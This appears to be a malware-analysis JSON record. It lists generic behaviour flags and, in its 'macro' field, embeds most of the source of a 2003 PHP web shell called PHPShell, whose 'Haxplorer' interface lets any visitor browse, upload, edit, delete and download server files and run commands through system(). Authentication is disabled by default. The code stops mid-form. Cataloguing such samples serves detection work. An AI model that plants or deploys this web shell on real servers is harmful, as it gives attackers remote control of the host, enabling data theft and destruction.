{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "command": "May run PowerShell commands",
            "downloadfile": "May download files from the Internet using PowerShell",
            "exec": "May run an executable file or a system command using Excel 4 Macros",
            "mkdir": "May create a directory",
            "open": "May open a file",
            "output": "May write to a file",
            "run": "May run an executable file or a system command",
            "shell": "May run an executable file or a system command",
            "system": "May run an executable file or a system command on a Mac"
        },
        "macro": "<?php \n\n/*\n*****************************************************************************************\n*                           PHPSHELL.PHP  BY MACKER     August 28th 2003                *\n***************************************************************************************** \n*                                                                                       *  \n*   Welcome to Macker's PHPShell script...                                              * \n*   This script will allow you to browse webservers etc...                              * \n*   Just copy the file to your directory and open it in your Internet Browser.          * \n*                                                                                       * \n*   The webserver should support PHP...                                                 * \n*                                                                                       * \n*   You can modify the script if you want, but please send me a copy to:                *  \n*                               DRAZZ01@HOTMAIL.COM                                     * \n***************************************************************************************** \n\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \n!!   PLEASE NOTE: You should use this script at own risk, it should do damage to the   !! \n!!                Sites or even the server... You are responsible for your own deeds.  !! \n!!                The admin of your webserver should always know you are using this    !!\n!!                script.                                                              !! \n!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \n*/ \n\n\n/*Setting some envirionment variables...*/ \n\n/* I added this to ensure the script will run correctly...\n   Please enter the Script's filename in this variable. */   \n$SFileName=$PHP_SELF;\n\n/* uncomment the two following variables if you want to use http\n   authentication. This will password protect your PHPShell */\n//$http_auth_user = \"phpshell\";\t/* HTTP Authorisation username, uncomment if you want to use this */\n//$http_auth_pass = \"phpshell\";\t/* HTTP Authorisation password, uncomment if you want to use this */\t    \n\nerror_reporting(0);\n$PHPVer=phpversion();\n$isGoodver=(intval($PHPVer[0])>=4);\n$scriptTitle = \"PHPShell\";\n$scriptident = \"$scriptTitle by Macker\";\n\n$urlAdd = \"\";\n$formAdd = \"\";\n\nfunction walkArray($array){\n  while (list($key, $data) = each($array))\n    if (is_array($data)) { walkArray($data); }\n    else { global $$key; $$key = $data; global $urlAdd; $urlAdd .= \"$key=\".urlencode($data).\"&\";}\n}\n\nif (isset($_PUT)) walkArray($_PUT);\nif (isset($_GET)) walkArray($_GET);\nif (isset($_POST)) walkArray($_POST);\n\n\n$pos = strpos($urlAdd, \"s=r\");\nif (strval($pos) != \"\") {\n$urlAdd= substr($urlAdd, 0, $pos);\n}\n\n$urlAdd .= \"&s=r&\";\n\nif (empty($Pmax))\n\t$Pmax = 125;   /* Identifies the max amount of Directories and files listed on one page */\nif (empty($Pidx)) \n\t$Pidx = 0;\n\n$dir = str_replace(\"\\\\\", \"/\", str_replace(\"//\", \"/\", str_replace(\"\\\\\\\\\", \"\\\\\", $dir )));\n$file = str_replace(\"\\\\\", \"/\", str_replace(\"//\", \"/\", str_replace(\"\\\\\\\\\", \"\\\\\", $file )));\n\n$scriptdate = \"August 28th 2003\";\n$scriptver = \"Version 2.6.6dev\";\n$LOCAL_IMAGE_DIR = \"img\";\n$REMOTE_IMAGE_URL = \"img\";\n$img = array(\n\t\t\t\t\"Edit\" \t\t=> \"edit.gif\",\n\t\t\t\t\"Download\" \t=> \"download.gif\",\n\t\t\t\t\"Upload\" \t=> \"upload.gif\",\n\t\t\t\t\"Delete\" \t=> \"delete.gif\",\n\t\t\t\t\"View\" \t\t=> \"view.gif\",\n\t\t\t\t\"Rename\" \t=> \"rename.gif\",\n\t\t\t\t\"Move\" \t\t=> \"move.gif\",\n\t\t\t\t\"Copy\" \t\t=> \"copy.gif\",\n\t\t\t\t\"Execute\" \t=> \"exec.gif\"\n            );\n\nwhile (list($id, $im)=each($img))\n\tif (file_exists(\"$LOCAL_IMAGE_DIR/$im\"))\n\t\t$img[$id] = \"<img height=\\\"16\\\" width=\\\"16\\\" border=\\\"0\\\" src=\\\"$REMOTE_IMAGE_URL/$im\\\" alt=\\\"$id\\\">\";\n\telse\n \t\t$img[$id] = \"[$id]\";\n\n\n\n\n/* HTTP AUTHENTICATION */\n\n    if  ( ( (isset($http_auth_user) ) && (isset($http_auth_pass)) ) && ( !isset($PHP_AUTH_USER) || $PHP_AUTH_USER != $http_auth_user || $PHP_AUTH_PW != $http_auth_pass)  ||  (($logoff==1) && $noauth==\"yes\")  )   { \n\t    setcookie(\"noauth\",\"\");\n\t    Header( \"WWW-authenticate:  Basic realm=\\\"$scriptTitle $scriptver\\\"\");\n\t    Header( \"HTTP/1.0  401  Unauthorized\");\n\t    echo \"Your username or password is incorrect\";\n\t    exit ;\n\t\t\t     \n    } \n\nfunction buildUrl($display, $url) {\n        global $urlAdd;\n        $url = $SFileName . \"?$urlAdd$url\";\n\treturn \"<a href=\\\"$url\\\">$display</a>\";\n}\n\nfunction sp($mp) {\n\tfor ( $i = 0; $i < $mp; $i++ )\n\t\t$ret .= \"&nbsp;\";\n\treturn $ret;\n}\n\nfunction spacetonbsp($instr) { return str_replace(\" \", \"&nbsp;\", $instr);  } \n\nfunction Mydeldir($Fdir) {\n\tif (is_dir($Fdir)) {\n\t\t$Fh=@opendir($Fdir);\n \t\twhile ($Fbuf = readdir($Fh))\n \t\t\tif (($Fbuf != \".\") && ($Fbuf != \"..\"))\n\t\t\t\tMydeldir(\"$Fdir/$Fbuf\");\n\t\t@closedir($Fh);\n\t\t\t\treturn rmdir($Fdir);\n\t}\telse {\n\t\treturn unlink($Fdir);\n\t}\n}\n\n\nfunction arrval ($array) {\nlist($key, $data) = $array;\nreturn $data;\n}\n\nfunction formatsize($insize) {  \n\t$size = $insize;\n\t$add = \"B\";\n\tif ($size > 1024) {\n \t\t$size = intval(intval($size) / 1.024)/1000;\n \t\t$add = \"KB\";\n \t}\n \tif ($size > 1024) {\n \t\t$size = intval(intval($size) / 1.024)/1000;\n \t\t$add = \"MB\";\n \t}\n \tif ($size > 1024) {\n \t\t$size = intval(intval($size) / 1.024)/1000;\n \t\t$add = \"GB\";\n \t}\n \tif ($size > 1024) {\n \t\t$size = intval(intval($size) / 1.024)/1000;\n \t\t$add = \"TB\";\n \t}\n \treturn \"$size $add\";\n}\n\nif ($cmd != \"downl\") {\n\t?>\n\n<!-- <?php echo $scriptident ?>, <?php echo $scriptver ?>, <?php echo $scriptdate ?>  -->\n<HTML>\n <HEAD>\n  <STYLE>\n  <!--\n    A{ text-decoration:none; color:navy; font-size: 12px }\n    body { font-size: 12px; \n           font-family: arial, helvetica;\n            scrollbar-width: 5;\n            scrollbar-height: 5;\n            scrollbar-face-color: white;\n            scrollbar-shadow-color: silver;\n            scrollbar-highlight-color: white;\n            scrollbar-3dlight-color:silver;\n            scrollbar-darkshadow-color: silver;\n            scrollbar-track-color: white;\n            scrollbar-arrow-color: black;\n    }\n    Table { font-size: 12px; }\n    TR{ font-size: 12px; }\n    TD{ font-size: 12px; \n        font-family: arial, helvetical;\n        BORDER-LEFT: black 0px solid; \n\tBORDER-RIGHT: black 0px solid; \n\tBORDER-TOP: black 0px solid; \n\tBORDER-BOTTOM: black 0px solid; \n\tCOLOR: black; \n    }\n    .border{       BORDER-LEFT: black 1px solid;\n \t\t   BORDER-RIGHT: black 1px solid;\n \t\t   BORDER-TOP: black 1px solid;\n \t\t   BORDER-BOTTOM: black 1px solid;\n \t\t }\n    .none  {       BORDER-LEFT: black 0px solid;\n \t\t   BORDER-RIGHT: black 0px solid;\n \t\t   BORDER-TOP: black 0px solid;\n \t\t   BORDER-BOTTOM: black 0px solid;\n \t\t }\n    .inputtext {\n\t\t    background-color: #EFEFEF;\n\t\t    font-family: arial, helvetica;\n\t\t    border: 1px solid #000000;\n\t\t    height: 20;\n    }\n    .lighttd {       background: #F8F8F8;\n    }\n    .darktd {        background: #E8E8E8;\n    }\n    input { font-family: arial, helvetica;\n    }\n    .inputbutton {\n                        background-color: silver;\n\t\t\tborder: 1px solid #000000;\n\t\t\tborder-width: 1px;\n\t\t\theight: 20;\n    }\n    .inputtextarea {\n\t\t    background-color: #EFEFEF;\n\t\t    border: 1px solid #000000;\n\t\t    scrollbar-width: 5;\n\t\t    scrollbar-height: 5;\n\t\t    scrollbar-face-color: #EFEFEF;\n\t\t    scrollbar-shadow-color: silver;\n\t\t    scrollbar-highlight-color: #EFEFEF;\n\t\t    scrollbar-3dlight-color:silver;\n\t\t    scrollbar-darkshadow-color: silver;\n\t\t    scrollbar-track-color: #EFEFEF;\n\t\t    scrollbar-arrow-color: black;\n    }\n    .top { BORDER-TOP: black 1px solid; }\n    .textin { BORDER-LEFT: silver 1px solid;\n              BORDER-RIGHT: silver 1px solid;\n \t      BORDER-TOP: silver 1px solid;\n              BORDER-BOTTOM: silver 1px solid;\n              width: 99%; font-size: 12px; font-weight: bold; color: navy;\n            }\n    .notop { BORDER-TOP: black 0px solid; }\n    .bottom { BORDER-BOTTOM: black 1px solid; }\n    .nobottom { BORDER-BOTTOM: black 0px solid; }\n    .left { BORDER-LEFT: black 1px solid; }\n    .noleft { BORDER-LEFT: black 0px solid; }\n    .right { BORDER-RIGHT: black 1px solid; }\n    .noright { BORDER-RIGHT: black 0px solid; }\n    .silver{ BACKGROUND: silver; }\n  -->\n  </STYLE>\n  <TITLE><?php echo $SFileName ?></TITLE>\n </HEAD>\n <body topmargin=\"0\" leftmargin=\"0\">\n <div style=\"position: absolute; background: white; z-order:10000; top:0; left:0; width: 100%; height: 100%;\">\n <table width=100% height=\"100%\" NOWRAP border=\"0\">\n  <tr NOWRAP>\n   <td width=\"100%\" NOWRAP>\n    <table NOWRAP width=100% border=\"0\" cellpadding=\"0\" cellspacing=\"0\">\n     <tr>\n      <td width=\"100%\" class=\"silver border\">\n       <center>\n\t    <strong>\n\t\t <font size=3><?php echo $scriptident ?> - <?php echo $scriptver ?> - <?php echo $scriptdate ?></font>\n            </strong>\n       </center>\n      </td>\n     </tr>\n    </table><br>\n\n\t<?php\n}\n\nif ( $cmd==\"dir\" ) {\n  \t$h=@opendir($dir);\n \tif ($h == false) {\n  \t\techo \"<br><font color=\\\"red\\\">\".sp(3).\"\\n\\n\\n\\n\n                COULD NOT OPEN THIS DIRECTORY!!!<br>\".sp(3).\"\\n\n                THE SCRIPT WILL RESULT IN AN ERROR!!!\n                <br><br>\".sp(3).\"\\n\n                PLEASE MAKE SURE YOU'VE GOT READ PERMISSIONS TO THE DIR...\n                <br><br></font>\\n\\n\\n\\n\";\n \t}\n        if (function_exists('realpath')) {\n\t\t$partdir = realpath($dir);\n\t}\n        else {\n\t\t$partdir = $dir;\n\t}\n \tif (strlen($partdir) >= 100) {\n \t\t$partdir = substr($partdir, -100);\n \t\t$pos = strpos($partdir, \"/\");\n \t\tif (strval($pos) != \"\") {\n \t\t\t$partdir = \"<--   ...\".substr($partdir, $pos);\n \t\t}\n        $partdir = str_replace(\"\\\\\", \"/\", str_replace(\"//\", \"/\", str_replace(\"\\\\\\\\\", \"\\\\\", $partdir )));\n        $dir = str_replace(\"\\\\\", \"/\", str_replace(\"//\", \"/\", str_replace(\"\\\\\\\\\", \"\\\\\", $dir ))); \n\t$file = str_replace(\"\\\\\", \"/\", str_replace(\"//\", \"/\", str_replace(\"\\\\\\\\\", \"\\\\\", $file )));\n \t}\n    ?>\n      <form name=\"urlform\" action=\"<?php echo \"$SFileName?$urlAdd\"; ?>\" method=\"POST\"><input type=\"hidden\" name=\"cmd\" value=\"dir\">\n         <table NOWRAP width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\">\n\t  <tr>\n\t   <td width=\"100%\" class=\"silver border\">\n\t    <center>&nbsp;HAXPLORER - Server Files Browser...&nbsp;</center>\n\t   </td>\n\t  </tr>\n\t </table>\n       <br>\n\t <table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\">\n\t  <tr>\n           <td class=\"border nobottom noright\">\n            &nbsp;Browsing:&nbsp;\n\t  </td>\n          <td width=\"100%\" class=\"border nobottom noleft\">\n   \t    <table width=\"100%\" border=\"0\" cellpadding=\"1\" cellspacing=\"0\">\n             <tr>\n              <td NOWRAP width=\"99%\" align=\"center\"><input type=\"text\" name=\"dir\" class=\"none textin\" value=\"<?php echo $partdir ?>\"></td>\n              <td NOWRAP><center>&nbsp;<a href=\"javascript: urlform.submit();\"><b>GO<b></a>&nbsp;<center></td>\n             </tr>\n            </table>\n            \n\t  </td>\n\t </tr>\n\t</table>\n  <!--    </form>   -->\n        <table NOWRAP width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" >\n         <tr>\n\t  <td width=\"100%\" NOWRAP class=\"silver border\">\n\t   &nbsp;Filename&nbsp;\n\t  </td>\n          <td NOWRAP class=\"silver border noleft\">\n\t   &nbsp;Actions&nbsp;(Attempt to perform)&nbsp;\n\t  </td>\n          <td NOWRAP class=\"silver border noleft\">\n\t   &nbsp;Size&nbsp;\n\t  </td>\n          <td width=1 NOWRAP class=\"silver border noleft\">\n\t   &nbsp;Attributes&nbsp;\n\t  </td>\n          <td NOWRAP class=\"silver border noleft\">\n\t   &nbsp;Modification Date&nbsp;\n\t  </td>\n\t <tr>\n    <?php\n\n\n      \t/* <!-- This whole heap of junk is the sorting section... */\n\n \t$dirn \t= array();\n \t$filen \t= array();\n \t$filesizes\t= 0;\n \twhile ($buf = readdir($h)) {\n\t    if (is_dir(\"$dir/$buf\"))\n\t\t\t$dirn[] = $buf;\n    \t\telse \n \t\t\t$filen[] = $buf;\n    \t}\t \t\n\t\t$dirno \t= count($dirn) + 1;\n \t\t$fileno\t= count($filen) + 1;\n\n  \t\tfunction mycmp($a, $b){\n\t\t\tif ($a == $b) return 0;\n\t\t\treturn (strtolower($a) < strtolower($b)) ? -1 : 1;\n\t\t}\n\n\t\tif (function_exists(\"usort\")) {\n\t\t\tusort($dirn, \"mycmp\");\n\t\t\tusort($filen, \"mycmp\");\n\t\t}\n\t\telse {\n\t\t\tsort ($dirn);\n\t \t\tsort ($filen);\n\t \t}\n\treset ($dirn);\n \treset ($filen);\n \tif (function_exists('array_merge')) {\n\t\t$filelist = array_merge ($dirn, $filen);\n\t}\n \telse {\n\t\t$filelist = $dirn + $filen;\n\t}\n\n\t\n\tif ( count($filelist)-1 > $Pmax ) {\n\t\t$from = $Pidx * $Pmax;\n\t\t$to = ($Pidx + 1) * $Pmax-1;\n\t\tif ($to - count($filelist) - 1 + ($Pmax / 2) > 0 )\n\t\t\t$to = count($filelist) - 1;\n\t\tif ($to > count($filelist)-1)\n\t\t\t$to = count($filelist)-1;\n\t\t$Dcontents = array();\n\t\tFor ($Fi = $from; $Fi <= $to; $Fi++) {\n\t\t\t$Dcontents[] = $filelist[$Fi];\t\n\t\t}\n\n\t}\n\telse {\n\t\t$Dcontents = $filelist;\n\t}\n\t\n     $tdcolors = array(\"lighttd\", \"darktd\");\n\n     while (list ($key, $file) = each ($Dcontents)) {\n          if (!$tdcolor=arrval(each($tdcolors))) {\n\t    reset($tdcolors);\n\t    $tdcolor = arrval(each($tdcolors));\t  }\n\t  \t         \n \t\tif (is_dir(\"$dir/$file\")) { /* <!-- If it's a Directory --> */\n          \t\t\t/* <!-- Dirname --> */\n\t\t\techo \"<tr><td NOWRAP class=\\\"top left right $tdcolor\\\">\".sp(3).buildUrl( \"[$file]\", \"cmd=dir&dir=$dir/$file\") .sp(9).\"</td>\\n\";\n  \t\t\t\t/* <!-- Actions --> */\n\t\t\techo \"<td NOWRAP class=\\\"top right $tdcolor\\\"><center>\".sp(2).\"\\n\";\n \t\t\t\t/* <!-- Rename --> */\n\t\t\tif ( ($file != \".\") && ($file != \"..\") )\n\t\t\t\techo buildUrl($img[\"Rename\"], \"cmd=ren&lastcmd=dir&lastdir=$dir&oldfile=$dir/$file\").sp(3).\"\\n\";\n \t\t\t\t/* <!-- Delete --> */\n\t\t\tif ( ($file != \".\") && ($file != \"..\") )\n\t\t\t\techo sp(3).buildUrl( $img[\"Delete\"], \"cmd=deldir&file=$dir/$file&lastcmd=dir&lastdir=$dir\").\"\\n\";\n\t\t\t\t/* <!-- End of Actions --> */\n\t\t\techo \"&nbsp;&nbsp;</center></td>\\n\";\n  \t\t\t\t/* <!-- Size --> */\n\t\t\techo \"<td NOWRAP class=\\\"top right $tdcolor\\\">&nbsp;</td>\\n\";\n \t\t\t\t/* <!-- Attributes --> */\n\t\t\techo \"<td NOWRAP class=\\\"top right $tdcolor\\\">&nbsp;&nbsp;\\n\";\n \t\t\techo \"<strong>D</strong>\";\n\t\t        if ( @is_readable(\"$dir/$file\") ) {\n   \t\t\t\techo \"<strong>R</strong>\";\n \t\t\t}\n \t\t\tif (function_exists('is_writeable')) {\n\t\t\t\tif ( @is_writeable(\"$dir/$file\") ) {\n \t\t\t\t\techo \"<strong>W</stong>\";\n \t\t\t\t}\n\t\t\t}\n \t\t\telse {\n    \t\t\t\techo \"<strong>(W)</stong>\";\n  \t\t\t}\n  \t\t\tif ( @is_executable(\"$dir/$file\") ) {\n \t\t\t\techo \"<Strong>X<strong>\";\n \t\t\t}\n \t\t\techo \"&nbsp;&nbsp;</td>\\n\";\n \t\t\t\t/* <!-- Date --> */\n\t\t\techo \"<td NOWRAP class=\\\"top right $tdcolor\\\" NOWRAP>\\n\";\n \t\t\techo \"&nbsp;&nbsp;\".date(\"D d-m-Y H:i:s\", filemtime(\"$dir/$file\")).\"&nbsp;&nbsp;\";\n \t\t\techo \"</td>\";\n\t\t\techo \"</tr>\\n\";\n\n        \t}\n  \t\telse { /* <!-- Then it must be a File... --> */\n     \t\t\t\t/* <!-- Filename --> */\n\t\t\tif ( @is_readable(\"$dir/$file\") )\n \t\t\t\techo \"<tr><td NOWRAP class=\\\"top left right $tdcolor\\\">\".sp(3).buildUrl( $file, \"cmd=file&file=$dir/$file\").sp(9).\"</td>\\n\";\n  \t\t\telse\n  \t\t\t\techo \"<tr><td NOWRAP class=\\\"top left right $tdcolor\\\">\".sp(3).$file.sp(9).\"</td>\\n\";\n  \t\t\t   \t\t\t\t/* <!-- Actions --> */\n\t\t\techo \"<td NOWRAP class=\\\"top right $tdcolor\\\"><center>&nbsp;&nbsp;\\n\";\n \t\t\t\t/* <!-- Rename --> */\n\t\t\techo buildUrl($img[\"Rename\"], \"cmd=ren&lastcmd=dir&lastdir=$dir&oldfile=$dir/$file\").sp(3).\"\\n\";\n  \t\t\t\t/* <!-- Edit --> */\n\t\t\tif ( (@is_writeable(\"$dir/$file\")) && (@is_readable(\"$dir/$file\")) )\n \t\t\t\techo buildUrl( $img[\"Edit\"], \"cmd=edit&file=$dir/$file\").sp(3).\"\\n\";\n   \t\t\t\t/* <!-- Copy --> */\n \t\t\techo buildUrl( $img[\"Copy\"], \"cmd=copy&file=$dir/$file\").\"\\n\";\n  \t\t\t\t/* <!-- Move --> */\n\t\t\tif ( (@is_writeable(\"$dir/$file\")) && (@is_readable(\"$dir/$file\")) )\n \t\t\t\t\techo sp(3). buildUrl( $img[\"Move\"], \"cmd=move&file=$dir/$file\").\"\\n\";\n    \t\t\t\t/* <!-- Delete --> */\n\t\t\techo sp(3). buildUrl( $img[\"Delete\"], \"cmd=delfile&file=$dir/$file&lastcmd=dir&lastdir=$dir\").\"\\n\";\n \t\t\t\t/* <!-- Download --> */\n\t\t\techo sp(3). buildUrl( $img[\"Download\"], \"cmd=downl&file=$dir/$file\").\"\\n\";\n \t\t\t\t/* <!-- Execute --> */\n\t\t\tif ( @is_executable(\"$dir/$file\") )\n \t\t\t\techo sp(3).buildUrl( $img[\"Execute\"], \"cmd=execute&file=$dir/$file\").\"\\n\";\n    \t\t\t\t/* <!-- End of Actions --> */\n\t\t\techo sp(2).\"</center></td>\\n\";\n \t\t\t\t/* <!-- Size --> */\n\t\t\techo \"<td NOWRAP align=\\\"right\\\" class=\\\"top right $tdcolor\\\" NOWRAP >\\n\";\n \t\t\t$size = @filesize(\"$dir/$file\");\n \t\t\tIf ($size != false) {\n\t\t\t        $filesizes += $size;\n\t\t\t\techo \"&nbsp;&nbsp;<strong>\".formatsize($size).\"<strong>\";\n\t\t\t}\n\t\t\telse\n\t\t\t\techo \"&nbsp;&nbsp;<strong>0 B<strong>\";\n \t\t\techo \"&nbsp;&nbsp;</td>\\n\";\n\n \t\t\t\t/* <!-- Attributes --> */\n\t\t\techo \"<td NOWRAP class=\\\"top right $tdcolor\\\">&nbsp;&nbsp;\\n\";\n\n \t\t\tif ( @is_readable(\"$dir/$file\") )\n \t\t\t\techo \"<strong>R</strong>\";\n   \t\t\tif ( @is_writeable(\"$dir/$file\") )\n \t\t\t\techo \"<strong>W</stong>\";\n   \t\t\tif ( @is_executable(\"$dir/$file\") )\n \t\t\t\techo \"<Strong>X<strong>\";\n   \t\t\tif (function_exists('is_uploaded_file')){\n \t\t\t\tif ( @is_uploaded_file(\"$dir/$file\") )\n \t\t\t\t\techo \"<Strong>U<strong>\";\n \t\t\t}\n \t\t\telse {\n\t\t\t\techo \"<Strong>(U)<strong>\";\n\t\t\t}\n \t\t\techo \"&nbsp;&nbsp;</td>\\n\";\n\t\t\t \t/* <!-- Date --> */\n\t\t\techo \"<td NOWRAP class=\\\"top right $tdcolor\\\" NOWRAP>\\n\";\n \t\t\techo \"&nbsp;&nbsp;\".date(\"D d-m-Y H:i:s\", filemtime(\"$dir/$file\")).\"&nbsp;&nbsp;\";\n \t\t\techo \"</td>\";\n \t\t\techo \"</tr>\\n\";\n \t\t}\n  \t}\n\n    \techo \"</table><table width=100% border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\"><tr>\\n<td NOWRAP width=100% class=\\\"silver border noright\\\">\\n\";\n  \techo \"&nbsp;&nbsp;\".@count ($dirn).\"&nbsp;Dir(s),&nbsp;\".@count ($filen).\"&nbsp;File(s)&nbsp;&nbsp;\\n\";\n  \techo \"</td><td NOWRAP class=\\\"silver border noleft\\\">\\n\";\n  \techo \"&nbsp;&nbsp;Total filesize:&nbsp;\".formatsize($filesizes).\"&nbsp;&nbsp;<td></tr>\\n\";\n\t\n\tfunction printpagelink($a, $b, $link = \"\"){\n\t\tif ($link != \"\") \n\t\t\techo \"<A HREF=\\\"$link\\\"><b>| $a - $b |</b></A>\";\n\t\telse\n\t\t\techo \"<b>| $a - $b |</b>\";\n\t}\n        \n\tif ( count($filelist)-1 > $Pmax ) {\n\t\techo \"<tr><td colspan=\\\"2\\\" class=\\\"silver border notop\\\"><table width=\\\"100%\\\" cellspacing=\\\"0\\\" cellpadding=\\\"3\\\"><tr><td valign=\\\"top\\\"><font color=\\\"red\\\"><b>Page:</b></font></td><td width=\\\"100%\\\"><center>\";\n\t\t$Fi = 0;\n\t\twhile ( ( (($Fi+1)*$Pmax) + ($Pmax/2) ) < count($filelist)-1 ) {\n\t\t\t$from = $Fi*$Pmax;\n\t\t\twhile (($filelist[$from]==\".\") || ($filelist[$from]==\"..\")) $from++; \n\t\t\t$to = ($Fi + 1) * $Pmax - 1;\n\t\t\tif ($Fi == $Pidx)\n\t\t\t\t$link=\"\";\n\t\t\telse \n\t\t\t\t$link=\"$SFilename?$urlAdd\".\"cmd=$cmd&dir=$dir&Pidx=$Fi\";\n\t\t\tprintpagelink (substr(strtolower($filelist[$from]), 0, 5), substr(strtolower($filelist[$to]), 0, 5), $link);\n\t\t\techo \"&nbsp;&nbsp;&nbsp;\";\n\t\t\t$Fi++;\n\t\t}\n\t\t$from = $Fi*$Pmax;\n\t\twhile (($filelist[$from]==\".\") || ($filelist[$from]==\"..\")) $from++; \n\t\t$to = count($filelist)-1;\n\t\tif ($Fi == $Pidx)\n\t\t\t$link=\"\";\n\t\telse \n\t\t\t$link=\"$SFilename?$urlAdd\".\"cmd=$cmd&dir=$dir&Pidx=$Fi\";\n\t\tprintpagelink (substr(strtolower($filelist[$from]), 0, 5), substr(strtolower($filelist[$to]), 0, 5), $link);\t\t\n\t\t\n\t\n\t\techo \"</center></td></tr></table></td></tr>\";\n\t}\n\n\n    \techo \"</table>\\n<br><table NOWRAP>\";\n\n  \tif ($isGoodver) {\n\t\techo \"<tr><td class=\\\"silver border\\\">&nbsp;<strong>Server's PHP Version:&nbsp;&nbsp;</strong>&nbsp;</td><td>&nbsp;$PHPVer&nbsp;</td></tr>\\n\";\n\t}\n \telse {\n\t\techo \"<tr><td class=\\\"silver border\\\">&nbsp;<strong>Server's PHP Version:&nbsp;&nbsp;</strong>&nbsp;</td><td>&nbsp;$PHPVer (Some functions might be unavailable...)&nbsp;</td></tr>\\n\";\n\t}\n      \t\t/* <!-- Other Actions --> */\n   \techo \"<tr><td class=\\\"silver border\\\">&nbsp;<strong>Other actions:&nbsp;&nbsp;</strong>&nbsp;</td>\\n\";\n  \techo \"<td>&nbsp;<b>\".buildUrl( \"| New File |\", \"cmd=newfile&lastcmd=dir&lastdir=$dir\").\"\\n\".sp(3).\n\t                     buildUrl( \"| New Directory |\", \"cmd=newdir&lastcmd=dir&lastdir=$dir\").\"\\n\".sp(3).\n\t\t\t     buildUrl( \"| Upload a File |\", \"cmd=upload&dir=$dir&lastcmd=dir&lastdir=$dir\"). \"</b>\\n</td></tr>\\n\";\n    \techo \"<tr><td class=\\\"silver border\\\">&nbsp;<strong>Script Location:&nbsp;&nbsp;</strong>&nbsp;</td><td>&nbsp;$PATH_TRANSLATED</td></tr>\\n\";\n  \techo \"<tr><td class=\\\"silver border\\\">&nbsp;<strong>Your IP:&nbsp;&nbsp;</strong>&nbsp;</td><td>&nbsp;$REMOTE_ADDR&nbsp;</td></tr>\\n\";\n  \techo \"<tr><td class=\\\"silver border\\\">&nbsp;<strong>Browsing Directory:&nbsp;&nbsp;</strong></td><td>&nbsp;$partdir&nbsp;</td></tr>\\n\";\n  \techo \"<tr><td valign=\\\"top\\\" class=\\\"silver border\\\">&nbsp;<strong>Legend:&nbsp;&nbsp;</strong&nbsp;</td><td>\\n\";\n  \techo \"<table NOWRAP>\";\n        echo \"<tr><td><strong>D:</strong></td><td>&nbsp;&nbsp;Directory.</td></tr>\\n\";\n   \techo \"<tr><td><strong>R:</strong></td><td>&nbsp;&nbsp;Readable.</td></tr>\\n\";\n  \techo \"<tr><td><strong>W:</strong></td><td>&nbsp;&nbsp;Writeable.</td></tr>\\n\";\n  \techo \"<tr><td><strong>X:</strong></td><td>&nbsp;&nbsp;Executable.</td></tr>\\n\";\n  \techo \"<tr><td><strong>U:</strong></td><td>&nbsp;&nbsp;HTTP Uploaded File.</td></tr>\\n\";\n  \techo \"</table></td>\";\n \techo \"</table>\";\n \techo \"<br>\";\n     \t@closedir($h);\n  }\n  elseif ( $cmd==\"execute\" ) {/*<!-- Execute the executable -->*/\n \techo system(\"$file\");\n }\nelseif ( $cmd==\"deldir\" ) { /*<!-- Delete a directory and all it's files --> */\n\techo \"<center><table><tr><td NOWRAP>\" ;\n \tif ($auth == \"yes\") {\n\t\tif (Mydeldir($file)==false) {\n \t\t\techo \"Could not remove \\\"$file\\\"<br>Permission denied, or directory not empty...\";\n  \t\t}\n \t\telse {\n \t\t\techo \"Successfully removed \\\"$file\\\"<br>\";\n \t\t}\n \t\techo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type=\\\"hidden\\\" name=\\\"cmd\\\" value=\\\"$lastcmd\\\"><input type=\\\"hidden\\\" name=\\\"dir\\\" value=\\\"$lastdir\\\"><input tabindex=\\\"0\\\" type=\\\"submit\\\" value=\\\"Back to Haxplorer\\\"></form>\";\n\t}\n \telse {\n\t\techo \"Are you sure you want to delete \\\"$file\\\" and all it's subdirectories ?\n        <form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\">\n        <input type=\\\"hidden\\\" name=\\\"cmd\\\" value=\\\"deldir\\\">\n     \t<input type=\\\"hidden\\\" name=\\\"lastcmd\\\" value=\\\"$lastcmd\\\">\n     \t<input type=\\\"hidden\\\" name=\\\"lastdir\\\" value=\\\"$lastdir\\\">\n     \t<input type=\\\"hidden\\\" name=\\\"file\\\" value=\\\"$file\\\">\n     \t<input type=\\\"hidden\\\" name=\\\"auth\\\" value=\\\"yes\\\">\n     \t<input type=\\\"submit\\\" value=\\\"Yes\\\"></form>\n        <form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\">\n\t<input type=\\\"hidden\\\" name=\\\"cmd\\\" value=\\\"$lastcmd\\\">\n\t<input type=\\\"hidden\\\" name=\\\"dir\\\" value=\\\"$lastdir\\\">\n\t<input tabindex=\\\"0\\\" type=\\\"submit\\\" value=\\\"NO!\\\"></form>\";\n        }\n \techo \"</td></tr></center>\";\n}\n elseif ( $cmd==\"delfile\" ) { /*<!-- Delete a file --> */\techo \"<center><table><tr><td NOWRAP>\" ;\n \tif ($auth == \"yes\") {\n\t\tif (@unlink($file)==false) {\n \t\t\techo \"Could not remove \\\"$file\\\"<br>\";\n  \t\t}\n \t\telse {\n \t\t\techo \"Successfully removed \\\"$file\\\"<br>\";\n \t\t}\n\t\techo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type=\\\"hidden\\\" name=\\\"cmd\\\" value=\\\"$lastcmd\\\"><input type=\\\"hidden\\\" name=\\\"dir\\\" value=\\\"$lastdir\\\"><input tabindex=\\\"0\\\" type=\\\"submit\\\" value=\\\"Back to Haxplorer\\\"></form>\";\n        }\n \telse {\n       \techo \"Are you sure you want to delete \\\"$file\\\" ?\n      \t<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\">\n     \t<input type=\\\"hidden\\\" name=\\\"cmd\\\" value=\\\"delfile\\\">\n     